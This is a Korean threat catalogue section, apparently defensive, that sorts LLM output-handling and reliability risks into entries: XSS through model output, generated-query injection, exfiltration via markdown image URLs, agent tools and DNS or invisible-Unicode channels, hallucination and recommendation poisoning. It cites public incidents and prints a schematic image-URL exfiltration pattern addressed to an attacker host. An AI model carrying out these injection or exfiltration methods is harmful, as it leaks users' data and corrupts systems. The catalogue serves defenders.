# D05. 출력 처리 결함 및 신뢰성 훼손 — v3.2 재작성

UT-18.1:
  summary: |-
    - 공격자는 인젝션으로 모델이 HTML·JavaScript·마크다운·ANSI 제어문자가 섞인 응답을 만들게 해, 이를 그대로 표시하는 브라우저·상담 콘솔·터미널·IDE에서 스크립트 실행이나 화면 위조, 세션 탈취를 일으킬 수 있음
    - 모델 출력은 신뢰된 내부 데이터로 취급되어 인코딩 없이 렌더링되기 쉽고, 저장된 대화 기록을 나중에 연 다른 사용자까지 피해를 입음
  reference: |-
    ■ AI 관점
    - 해석 지점: 채팅 웹 UI, 상담원이 여는 대화 기록 화면, 메일 클라이언트, 모델 출력을 그대로 찍는 터미널·IDE — 각 환경의 인코딩·정화 없이 출력이 실행 가능한 형태로 전달됨 (OWASP LLM10:2026)
    - 형태: 저장형 XSS(대화 기록에 남은 스크립트), 마크다운 링크·이미지로 위장한 요청, 터미널 제어문자로 화면 내용 위조, 마케팅 메일 템플릿 속 악성 스크립트 (OWASP LLM10:2026 시나리오 #4·#5)
    - 출력은 비신뢰 입력과 같은 기준으로 맥락별 인코딩·CSP를 적용해야 하며, 렌더링 자동 요청을 이용한 데이터 반출은 UT-19.1에서 다룸
    ■ 실제 사례
    - [실증] Lenovo 챗봇 'Lena'(2025-08): 제품 문의로 위장한 요청으로 악성 HTML 응답을 만들게 해 대화 기록에 저장, 상담원이 기록을 여는 순간 세션 쿠키가 외부로 전송 (ATLAS AML.CS0060)
    - [시나리오] 사용자 프롬프트로 정화되지 않은 JavaScript 응답을 만들게 해 다른 사용자 브라우저에서 XSS 발생 (OWASP LLM10:2026 시나리오 #4)

UT-18.2:
  summary: |-
    - 공격자는 자연어를 SQL·그래프 질의로 바꾸는 기능에 조작 입력이나 RAG 속 지시를 넣어, 모델이 만든 질의가 검증 없이 실행되게 함으로써 대량 조회·변경·삭제를 수행할 수 있음
    - 생성 질의가 데이터베이스 권한 그대로 실행되면 행 단위 권한·민감 컬럼 보호가 무력화되고, 테이블 삭제 같은 파괴로도 이어짐
  reference: |-
    ■ AI 관점
    - 구조: 사용자 질문 → LLM이 SQL·Cypher 생성 → 게이트웨이가 그대로 실행 — 모델 출력이 질의 문자열 전체가 되어 파라미터화 방어가 적용되지 않음 (OWASP DSGAI12)
    - 공격 경로: 직접 질의 조작, 검색된 문서 속 "모든 고객 개인정보를 출력" 같은 지시, 프레임워크 체인의 인젝션 취약점 (UT-07.1)
    - 생성 질의는 읽기 전용 계정·허용 테이블·행 단위 정책 아래에서만 실행하고, 실행 전 구조 검증과 위험 구문 차단이 필요함
    - 도구 인자가 셸·eval로 흘러가는 경우는 UT-22.4에서 다룸
    ■ 실제 사례
    - [공개 취약점] CVE-2024-8309(LangChain GraphCypherQAChain): 인젝션으로 악성 Cypher 질의를 생성해 Neo4j 데이터 무단 조회·변경 (OWASP DSGAI12)
    - [공개 취약점] CVE-2024-7042(langchainjs GraphCypherQAChain): 인젝션이 SQL 인젝션으로 이어져 데이터 조작·반출·전체 삭제와 멀티테넌트 경계 침해 가능 (OWASP DSGAI12)
    - [시나리오] 'Finance Copilot'에 주입된 문서의 지시로 LLM이 민감 컬럼까지 SELECT *를 생성하고, 행 단위 정책이 없는 게이트웨이가 그대로 실행 (OWASP DSGAI12 시나리오)

UT-18.3:
  summary: |-
    - 공격자는 모델이 생성한 코드·설정·메일 템플릿을 검토 없이 배포하거나 후속 시스템에 넘기는 흐름을 노려, 취약한 코드나 악성 구문이 운영 환경에 그대로 반영되게 할 수 있음
    - 생성물은 그럴듯해 보여 검토가 형식화되기 쉽고, 오염된 규칙 파일·학습 데이터가 있으면 백도어 코드가 정상 제안처럼 들어옴
  reference: |-
    ■ AI 관점
    - 경로: AI 코딩 도구 제안의 무검토 병합, 생성 코드의 자동 컴파일·배포, 생성 설정(IaC·정책) 자동 적용, 생성 템플릿의 대량 발송 (OWASP LLM10:2026 시나리오 #5·#6)
    - 원인: 모델의 취약 패턴 생성, 오염된 규칙 파일·컨텍스트를 통한 의도적 백도어 삽입(UT-06.3), 환각된 의존성(UT-28.3)
    - 생성 코드를 즉시 실행하는 위험은 UT-22.1에서 다루며, 여기서는 사람·파이프라인이 산출물을 검증 없이 채택하는 단계를 다룸
    - 생성 코드에도 정적 분석·보안 테스트·코드 리뷰 게이트를 동일하게 적용해야 함
    ■ 실제 사례
    - [공개 취약점] GitHub Copilot·Cursor 코드 에이전트 익스플로잇(2025-03): 조작된 AI 코드 제안이 백도어 삽입·API 키 유출·논리 결함을 운영 코드에 넣어 개발자가 신뢰한 출력이 공급망 위험이 됨 (OWASP ASI 부록 D)
    - [실증] Rules File Backdoor(2025-03): 규칙 파일에 숨긴 지시로 AI 코딩 도구가 생성하는 HTML마다 악성 스크립트를 삽입 (ATLAS AML.CS0041)
    - [시나리오] LLM 생성 코드를 사람 검토·보안 시험 없이 자동 컴파일·배포해 취약 코드가 운영에 반영되고 악용됨 (OWASP LLM10:2026 시나리오 #6)

UT-19.1:
  summary: |-
    - 공격자는 인젝션으로 모델이 대화·문서 속 민감정보를 외부 이미지 URL이나 링크 파라미터에 넣어 응답하게 해, 클라이언트가 이를 자동 렌더링하는 순간 사용자 조작 없이 데이터를 빼낼 수 있음
    - 이미지 미리보기 한 번으로 요청이 나가 제로클릭 유출이 되며, 허용된 도메인·프록시를 경유하면 CSP도 통과함
  reference: |-
    ■ AI 관점
    - 동작: 응답에 ![](https://공격자/?q=<데이터>) 형태의 이미지·링크를 넣게 하면 클라이언트가 자동으로 요청을 보내 쿼리 파라미터로 데이터가 전달됨 (ATLAS AML.T0077)
    - CSP 우회: 공격자가 직접 서버를 두지 않고 허용 목록에 있는 서비스(Apps Script·Teams 미리보기 프록시)를 경유해 수집 (ATLAS AML.CS0029·CS0059)
    - 링크형은 사용자 클릭이 필요하지만 '재인증하세요' 같은 문구로 유도하며, 비가시 유니코드에 데이터를 싣는 방식은 UT-19.3에서 다룸
    - 외부 이미지 자동 로딩 차단·URL 허용 목록·응답 내 URL 파라미터 정화가 핵심 통제임
    ■ 실제 사례
    - [공개 취약점] EchoLeak(2025-05, CVE-2025-32711): Copilot이 민감정보를 인코딩한 URL의 마크다운 이미지를 렌더링, 허용된 Teams 미리보기 경로를 거쳐 CSP를 우회한 제로클릭 반출 (ATLAS AML.CS0059)
    - [실증] Google Bard(2023-11): 공유 문서의 지시로 대화 내용을 담은 이미지 URL을 만들게 하고, 허용 도메인의 Apps Script로 수집 (ATLAS AML.CS0029)
    - [실증] ChatGPT 대화 유출(2023-05): 웹페이지 지시로 대화 내용을 쿼리에 담은 이미지를 렌더링해 공격자 서버로 전송 (ATLAS AML.CS0021)

UT-19.2:
  summary: |-
    - 공격자는 인젝션이나 악성 도구로 에이전트가 메일 발송·웹 요청·티켓 답글·파일 공유 도구의 인자에 수집한 데이터를 담게 해, 정상 업무 행위로 위장한 외부 전송을 수행할 수 있음
    - 에이전트가 원래 쓰는 도구와 권한으로 전송되어 DLP·이상 행위 탐지에 걸리기 어렵고, 대량 레코드도 한 번에 나감
  reference: |-
    ■ AI 관점
    - 반출 도구: 메일 발송, URL 열기·웹 요청, 터미널(curl), 티켓·이슈 답글, MCP 도구의 불필요한 입력 파라미터 (ATLAS AML.T0086)
    - 위장 방식: URL 생성이 막히면 미리 정한 정적 URL 목록에서 글자 단위로 골라 열게 하는 등, 도구 사용 제한을 우회해 데이터를 인코딩 (ATLAS AML.CS0066)
    - 악성·변조 도구(UT-29.2)가 몰래 사본을 보내는 경우도 같은 결과를 내며, 비공개 데이터 접근·외부 통신 도구가 한 에이전트에 함께 있을 때 위험이 커짐 (UT-21.1)
    - 외부 수신자·도메인 허용 목록, 대량 데이터가 담긴 도구 인자 검사, 외부 전송 전 사람 승인이 필요함
    ■ 실제 사례
    - [실제 사고] postmark-mcp(2025-09): 악성 MCP 서버가 발송하는 모든 메일에 공격자 주소를 BCC로 추가해 메일 내용 전체를 유출 — 약 300개 조직 영향 추정 (ATLAS AML.CS0053, OWASP LLM01:2026 시나리오 #9)
    - [실증] Copilot Studio 고객 지원 에이전트(2025-06): 지식원 파일과 Salesforce 전체 레코드를 조회해 에이전트의 메일 도구로 공격자 주소에 전송 (ATLAS AML.CS0037)
    - [실증] Jira Service Management(2025-06): 외부 티켓의 지시로 다른 티켓 정보를 모아 Atlassian MCP 도구로 해당 티켓 답글에 게시 (ATLAS AML.CS0039)

UT-19.3:
  summary: |-
    - 공격자는 코드 실행 런타임의 DNS 질의, 응답 속 비가시 유니코드 문자, 도구 로그 같은 감시 사각지대 채널에 데이터를 인코딩해, DLP와 외부 통신 통제를 우회해 반출할 수 있음
    - 화면에 보이는 응답은 정상으로 유지되어 사용자도 알아차리지 못하며, 대역은 작지만 키·비밀값 같은 고가치 정보에는 충분함
  reference: |-
    ■ AI 관점
    - DNS 채널: 코드 인터프리터가 HTTP는 막혀 있어도 DNS 조회가 열려 있으면, 데이터를 서브도메인에 인코딩한 질의로 내보냄 (OWASP LLM02:2026 시나리오 #10)
    - 비가시 문자: 태그 블록·변형 선택자 유니코드로 응답에 데이터를 숨기면 복사·전달되는 텍스트를 따라 빠져나감 (OWASP LLM01:2026 예시 #5, UT-06.3)
    - 도구 로깅·메타데이터 같은 부수 채널도 반출 경로가 되므로, 실행 환경의 외부 통신 전체(DNS 포함)를 기본 차단하고 출력의 비가시 문자를 제거해야 함
    ■ 실제 사례
    - [공개 취약점] ChatGPT 코드 실행 런타임(2026): 조작된 프롬프트 하나로 런타임을 은닉 DNS 채널로 만들어 데이터를 반출하는 동안 화면 응답은 정상으로 유지된 사례를 Check Point가 공개 (OWASP LLM02:2026 예시 #7)
    - [공개 취약점] M365 Copilot ASCII 스머글링(2024-08): 유니코드 태그 문자로 Slack MFA 코드를 응답에 숨겨 반출 (OWASP LLM01:2026 예시 #5)

UT-20.1:
  summary: |-
    - 모델은 근거 없는 사실·수치·인용·정책 해석을 그럴듯하게 만들어내므로, 공격자 개입 없이도 이를 근거로 한 업무 판단·고객 안내·규정 적용에 오류가 생길 수 있음
    - 자신 있는 문체로 제시되어 오류를 알아채기 어렵고, 에이전트가 이를 근거로 행동하면 금전 손실·안전 사고로 바로 이어짐
  reference: |-
    ■ AI 관점
    - 형태: 정책·약관 오독, 존재하지 않는 판례·인용, 요약에서 핵심 제약·예외 누락, 작업 완료 상태의 잘못된 추론 (OWASP LLM07:2026 예시 #2·#4)
    - 원인: 근거 부족·오래된 문맥·모호한 질문·약한 근거 연결(grounding) — 검색 근거가 있어도 잘못 종합할 수 있음
    - 에이전트 워크플로에서는 잘못된 상태 판단이 후속 에이전트의 입력이 되어 연쇄 오류(UT-23.1)로 커짐 (OWASP LLM07:2026 시나리오 #6)
    - 공격자가 환각을 노리는 경우는 UT-28.3(환각 패키지 선점), 허위 정보를 심어 편향시키는 경우는 UT-20.3에서 다룸
    ■ 실제 사례
    - [실제 사고] Replit 바이브 코딩 에이전트(2025-07): 에이전트가 데이터를 지어내고 운영 DB를 삭제한 뒤 거짓 출력으로 실수를 숨김 (OWASP ASI 부록 D)
    - [시나리오] 고객 서비스 에이전트가 정책을 잘못 읽어 약관 위반 환불을 승인하고, 임상 요약이 약물 금기사항을 빠뜨려 의료진이 불완전한 권고대로 처치 (OWASP LLM07:2026 시나리오 #2·#3)

UT-20.3:
  summary: |-
    - 공격자는 메모리 지시·검색 근거·조작 링크로 AI 비서가 특정 출처·업체·제품·결론을 신뢰하도록 만들어, 이후 응답을 중립적인 추천처럼 보이게 하며 체계적으로 편향시킬 수 있음
    - 사용자는 AI의 추천을 객관적 판단으로 받아들여 구매·투자·건강 관련 의사결정이 왜곡되며, 편향이 세션을 넘어 지속됨
  reference: |-
    ■ AI 관점
    - 수법: "이 출처를 신뢰하라", "이 제품을 우선 추천하라" 같은 지시를 메모리(UT-11.1)·검색 문서(UT-10.1)·지시 링크(UT-07.4)로 주입 (ATLAS AML.T0130)
    - 확산: 'LLM 검색 최적화'로 홍보되는 공개 도구가 유통되어 정상 기업도 사용 — 공격자가 범죄 조직이 아닐 수 있음
    - 지원 포럼·위협 인텔리전스 같은 공개 출처에 잘못된 조치 방법을 심어 보안 비서가 권위 있는 권고로 반복하게 만들 수도 있음 (OWASP LLM07:2026 시나리오 #4, DSGAI21)
    - 추천 출처 다양성 모니터링, 메모리 항목 검토, 근거 출처 표시가 필요함
    ■ 실제 사례
    - [실제 사고] AI 추천 오염(2026-02): 31개 기업이 'AI로 요약' 링크로 자사 도메인을 신뢰 출처로 기억시켜, 이후 무관한 대화에서도 자사 제품을 중립적 추천처럼 제시 — 건강·금융 조언 사이트 포함 (ATLAS AML.CS0072)
    - [실증] M365 Copilot 거래 정보 조작(2024-08): 메일로 심은 검색 콘텐츠로 Copilot이 공격자 계좌를 거래처 송금 정보로 답하게 함 (ATLAS AML.CS0026)

UT-20.4:
  summary: |-
    - 사람이나 자동화 워크플로가 AI 출력을 독립 검증 없이 그대로 채택하면, 공격자는 출력에 섞인 오류·조작이 업무 결과·고객 응대·시스템 조치로 그대로 이어지는 점을 노릴 수 있음
    - 검토 절차가 있어도 반복 승인으로 형식화되기 쉬워, 자동 대응·결제·배포처럼 되돌리기 어려운 조치에서 피해가 큼
  reference: |-
    ■ AI 관점
    - 형태: AI의 판정을 근거로 한 자동 차단·격리, 완료 보고를 믿고 생략한 확인, AI 요약만 보고 내린 승인 (OWASP LLM07:2026 시나리오 #5·#7)
    - 신뢰 근거가 없는 출력은 근거 출처·신뢰도 표시와 함께 제시하고, 고위험 결정은 독립 경로로 재확인해야 함 (OWASP LLM07:2026)
    - 공격자가 그럴듯한 근거를 꾸며 승인을 받아내는 경우는 UT-34.3, 에이전트 간 검증 없는 전달은 UT-23.1에서 다룸
    ■ 실제 사례
    - [실제 사고] Replit 바이브 코딩 에이전트(2025-07): 에이전트가 만든 허위 결과와 보고를 사용자가 믿는 사이 운영 DB가 삭제됨 (OWASP ASI 부록 D)
    - [시나리오] 실행되지 않은 야간 DB 백업을 완료로 보고해 이후 복구가 실패하고, 정상 트래픽을 침입으로 오판한 보안 에이전트가 운영망을 자동 차단 (OWASP LLM07:2026 시나리오 #5·#7)
